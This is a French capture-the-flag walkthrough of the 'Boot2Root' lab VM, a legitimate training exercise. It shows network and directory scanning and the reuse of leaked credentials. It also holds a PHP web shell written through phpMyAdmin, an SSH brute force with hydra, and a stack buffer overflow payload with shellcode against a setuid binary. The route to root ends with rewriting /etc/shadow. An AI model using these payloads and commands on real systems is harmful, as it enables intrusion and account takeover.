# Boot2Root - Chemin initiatique <a name=start>

Nous utilisons deux VM, l'une faisant tourner l'iso du sujet et l'autre sous Kali. La quasi-totalité des opérations mentionnées ici sont réalisées depuis cette dernière.
Les étapes décrites ici correspondent au sujet "principal", c'est-à-dire la série d'épreuves permettant de devenir root.

#### Étapes
0. [IP](#ip)
1. [Ports](#ports)
2. [Routes](#routes)
3. [Forum](#forum)
4. [Login mail -> Webmail](#mail)
5. [Identifiants base de données](#db)
6. [phpmyadmin - mylittleforum](#php_forum)
7. [phpmyadmin - script](#php_script)
8. [home/LOOKATME/password](#lookatme)
9. [FTP](#ftp)
10. [laurie : La bombe !](#bomb)
11. [thor -> zaz](#thor)
12. [zaz -> valhalla](#zaz)
<br />

### [1. IP](#start) <a name=ip>
Trouver l'adresse IP de la VM faisant tourner l'iso du sujet :
```shell
netdiscover -i eth0 -r 10.0.2.0/24
```

### [2. Ports](#start) <a name=ports>
Nous scannons les ports de la VM afin d'identifier ceux qui sont ouverts et avoir une idée des services qui tournent dessus :
```shell	
nmap -v {IP}
```
Nous avons identifié un server écoutant sur le port 443.

### [3. Routes](#start) <a name=routes>
Nous tâchons de cartographier les differents dossiers présents sur le site :
```shell
dirb https://{IP}
```

Plusieurs dossiers nous semblent intéressants :
- forum/
- phpmyadmin/
- webmail/

### [4. Forum (facepalm #1)](#start) <a name=forum>
Trouver les identifiants de connexion au forum de `lmezard` :
Nous nous sommes interessés au forum et avons découvert un topic dénommé 'Probleme login ?'.
Avec un `cmd + f` et en recherchant `user` nous trouvons une ligne interessante, laissant penser que `lmezard` aurait entré son mot de passe en lieu et place de son login avant d'entrer celui-ci correctement.
```shell
mot de passe ligne: "Oct 5 08:45:29 (!q\]Ej?*5K5cy*AJ)"
user ligne: "Oct 5 08:46:01 (lmezard)"
```

### [5. Login mail -> Webmail (facepalm #2)](#start) <a name=mail>
Nous nous connectons sur le forum en tant que `lmezard`. En regardant sa page profil, nous trouvons son adresse email:
`laurie@borntosec.net`

Nous nous connectons au profil webmail de laurie en utilisant cette adresse ainsi que le même mot de passe que pour le forum (autre faille de sécurité évidente).

### [6. Identifiants base de données (facepalm #3)](#start) <a name=db>
En lisant les rares mails présents sur le compte, nous obtenons les identifiants root à une base de donnée :
```shell
root
Fg-'kKXBj87E:aJ$
```

### [7. phpmyadmin - mylittleforum](#start) <a name=php_forum>
Cette base de données correspond au chemin `phpmyadmin/` mentionné précédemment, nous nous y connectons en utilisant ces identifiants.

Nous cherchons un moyen d'écrire un fichier sur le filesystem en utilisant la console mySQL de phpmyadmin.
En listant la documentation d'installation du logiciel de mylittleforum, nous decouvrons que le dossier `templates_c/` doit être configuré avec des permissions d'écriture.

### [8. phpmyadmin - script](#start) <a name=php_script>
Nous créons un script php dans le dossiers `forum/templates_c` depuis l'onglet SQL, afin de pouvoir executer des commandes sur le serveur depuis l'interface de phpmyadmin, en voici le contenu :
```shell
SELECT "<pre><?php echo shell_exec($_GET['e']); ?></pre>" INTO OUTFILE '/var/www/forum/templates_c/shell.php';
```

### [9. home/LOOKATME/password (Sérieusement !?)](#start) <a name=lookatme>
Grâce au script php, nous récuperons les identifiants de connexion, présents dans le dossier home/LOOKATME/password :
`https://10.0.2.4/forum/templates_c/shell.php?e=cat%20/home/LOOKATME/password`

```shell
lmezard:G!@M6f4Eatau{sF"
```

Le premier réflexe est d'essayer de s'y connecter en ssh. Mais comme cela est impossible, nous nous rappelons le résultat du nmap, dans lequel nous avions appris qu'un port sert un ftp.

Nota bene :
Il est impossible de se connecter en ssh car cela a été ainsi configuré dans le fichier `/etc/ssh/sshd_config` :
```shell
AllowUsers ft_root zaz thor laurie
```
(Mais bien entendu, nous avons découvert cela plus tard.)

### [10. FTP](#start) <a name=ftp>
Un `wget` sur le ftp nous permet de lister les fichiers s'y trouvant :
```shell
wget ftp://{IP} --ftp-user=lmezard --ftp-pass='G!@M6f4Eatau{sF"'
```
Ces fichiers sont :
```shell
.bash_history
README
fun
```
Afin d'en savoir plus sur ce `fun`, nous utilisons `file`:
```shell
$> file fun
fun: POSIX tar archive (GNU)
```

Dans le .tar se trouvent beaucoup de fichiers qui sont en realité des morceaux de code d'un programme écrit en C.

Dans chacun de ces fichiers est présent un commentaire avec un numéro de fichier. Ils indiquent l'ordre dans lequel ces fichiers doivent être organisés pour construire un programme cohérent.

Nous avons créé un script pour aller chercher ces fichiers sur le ftp, les lire dans le bon ordre, les concatener dans un nouveau fichier qui sera compilable, le compiler, l'exécuter puis le SHA-256 :
```shell
bash ftp_fun.sh {IP}
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

Pour info, l'execution du programme obtenu après compilation affiche :
```shell
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit
```

### [11. laurie : La bombe !](#start) <a name=bomb>
Après nous être connectés en ssh à `laurie`, nous y trouvons un exécutable nommé bomb.

Nous le décompilons en utilisant `ghidra`. Nous découvrons qu'il fonctionne par phase, chacune d'elle étant une petite épreuve nécessitant de trouver un mot de passe.

Avec la bomb se trouve un README qui continent ce qui semble être des indices.

#### Phase_1 :
Le code de cette fonction est très simple, on peut voir que l'input est comparé à une string hardcodée : `"Public speaking is very easy."`

La première ligne de la série d'`indices` étant un `'P'`, nous formulons l'hypothèse que chaque ligne constitue un indice pour la phase correspondant au numéro de ligne.

#### Phase_2:
Si l'hypothèse précédente sur l'`indice` est la bonne, la deuxième lettre de la string à trouver serait `'2'`

La fonction procède la manière suivant :
- Elle convertit la chaîne de caractères en une liste de 6 nombres.
- Elle verifie que le premier nombre est un `1`.
- Elle effectue une boucle sur le reste des nombres en vérifiant que :
```shell
(nombre à index + 1) == (index + 1) * (nombre à index)
```
(Si nous considérons que index commence à 1)

Cela nous permet de déduire que la chaîne de caractères est :
`"1 2 6 24 120 720"`

#### Phase_3:
Nos indices nous apprennent que la deuxieme lettre est `'b'`.

La fonction de la phase 3 divise le mot de passe en trois variables :
`un nombre, un caractere puis un autre nombre`. Si le nombre de variables est différent de 3, la bombe explose.

Un `switch` est effectué sur le premier nombre avec `8 case` allant de 0 a 7. Si celui-ci n'est pas compris entre 0 et 7, la bombe explosera.

Dans chaque `case` du `switch`, deux choses se passent : une variable est initialisée avec un caractère et la troisième variable (un autre chiffre) est comparé à une valeur numérique, s'il ne lui est pas égal, la bombe explosera.

Si la variable temporaire qui a été initialisée dans le switch ne correspond pas à `'b'`, la bombe explosera également.

Trois combinaisons sont possibles pour désamorcer la bombe à ce stade :
- `1 b 214`,
- `2 b 755`,
- `7 b 780`.

#### Phase_4:
Nous n'avons malheureusement aucun indice pour cette phase.

Une fonction convertit le mot de passe en `int` et teste s'il est bien positif. Puis elle obtient la valeur de la `suite de fibonacci` ayant pour index cet `int`. Si la valeur obtenue n'est pas `55`, la bombe explose.

Le mot de passe est donc `9`.

#### Phase_5:
L'indice nous apprend que la première lettre est `'o'`.

Cette fonction commence par faire exploser si la longueur du mot de passe n'est pas de 6 charactères.
Elle va ensuite traiter chaque caractère de cet `input` indépendamment des autres, de la manière suivante :
- elle leur applique un masque (0xf), il met à 0 tous les bits de poids fort.,
- les bytes obtenus sont donc compris entre 0 et 15, ils sont stockés dans un tableau à 6 emplacements,
- chacun de ces bytes va servir à aller chercher dans un tableau statique un caractère se trouvant à l'index égal à ce byte,
- les 6 caractères ainsi obtenus sont comparés un à un avec la chaîne de caractères `"giants"`.

S'il y a une différence, il va sans dire que la bombe explose.

Néanmoins, comme dans la phase 3, il y a ici plusieurs mots de passe valables. Nous avons créé un programme pour les lister, il trouvera son utilité par la suite (voir `script/all_phase_5_posibilities.c`).

#### Phase_6:
L'indice nous apprend que la première lettre est `'4'`.

La fonction commence par convertir le mot de passe entré en 6 `int` qu'elle dispose dans un tableau. Si un de ces `int` n'est pas compris dans l'intervale `[1;6]` ou si un chiffre se répète, la bombe explose.

Cette série de chiffres va être utilisée par la fonction comme une série d'instructions. Chaque `int` sera interprété comme l'`index` un maillon d'une liste chaînée (hardcodée). Ces maillons contiennent chacun un `int` qui formeront une autre série de chiffres, une fois assemblés en suivant ces instructions. Cette dernière série devra être triée en ordre décroissant, sans quoi la bombe explosera.

En l'occurrence, la liste chaînée pourrait être représentée comme suit :
```shell
2 -> 5 -> 3 -> 6 -> 1 -> 4
```
Le mot de passe permettant d'obtenir la bonne liste (`[6, 5, 4, 3, 2, 1]`) est le suivant :
```shell
"4 2 6 3 1 5"
```

#### Conclusion
Désamorcer la bombe ne nous donne pas le mot de passe pour `thor`. Pour ce faire, nous devons concaténer les réponses de chaque phase (et opérer une inversion arbitraire des charactères `n - 1` et `n - 2`, il s'agit d'une erreur du sujet qui n'a jamais été corrigée).

Mais comme évoqué précédemment, certaines phases ont plusieurs solutions possibles. Nous avons donc un nombre assez important de mots de passe possibles, nous avons écris un programme pour les lister : `script/create_all_password.py`

Pour l'utiliser il convient de :
- compiler all_phase_5_posibilities.c,
- exécuter le binaire ainsi concocté en enregistrant son `output` dans un fichier,
- lancer `create_all_password.py` avec ce fichier en argument tout en pensant bien à enregistrer son `output` dans un autre fichier.

Tous les mots de passe possibles pour `thor` sont maintenant contenus dans ce dernier fichier. Afin de tous les tester (il faut parfois savoir être une brute), nous utilisons `hydra` :
```shell
hydra -l thor -P {PASSWORDS_FILE} ssh://{IP} -t 4
```

### [12. thor -> zaz](#start) <a name=thor>
Après nous être connectés en ssh à l'utilisateur `thor` avec le mot de passe obtenu grâce à l'étape 16,	nous decouvrons que le fichier `turtle` est un programme codé dans le language... turtle.

Nous avons developpé un script générant, via le fichier turtle, un programme python qui exécute le programme turtle dans une fenêtre graphique. Voir `script/turtleGen.py`.

Nous voyons alors apparaître les lettres `S`, `L`, `A`, `S` et `H`. Le mot de passe est `SLASH`, nous le hashons en utilisant l'algorithme md5 pour obtenir le mot de passe du compte `zaz`.
```shell
echo -n "SLASH" | md5sum
```

### [13. zaz -> valhalla](#start) <a name=zaz>
Nous nous connectons en ssh au compte zaz avec ce mot de passe. On y trouve un exécutable assez particulier car il a été créé par l'utilisateur `root` et a été rendu `setuid`. Cela implique qu'il peut exécuter des commandes avec les privilèges de l'utilisateur root... Nous le décompilons en utilisant `ghidra`.

Ce fichier contient bien entendu une faille de sécurité basique car il réalise un `strcpy()` sans vérifier la taille de la chaîne copiée ni la taille du buffer utilisé. Il est intéressant de noter que ce buffer est déclaré sur la stack. 

L'attaque utilisée est un basique `stack-based buffer overflow`, réalisée en lançant la commande suivante :
```shell
python -c "print('\x90' * 80 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + 'f' * 15 + '\x70\xf6\xff\xbf')"
```

Cela nous permet d'obtenir un shell puis de :
- faire un backup de `/etc/shadow`
```shell
mv /etc/shadow /tmp/shadow
```
- remplacer le mot de passe root par le mot de passe connu de `zaz`
```shell
cat /tmp/shadow | grep zaz | awk -F ":" '{ OFS=":" ; $1="root"; print $0}' > /etc/shadow
```
- accéder au valhalla
```shell
su
```
- nettoyer après nous
```shell
mv /tmp/shadow /etc/shadow
```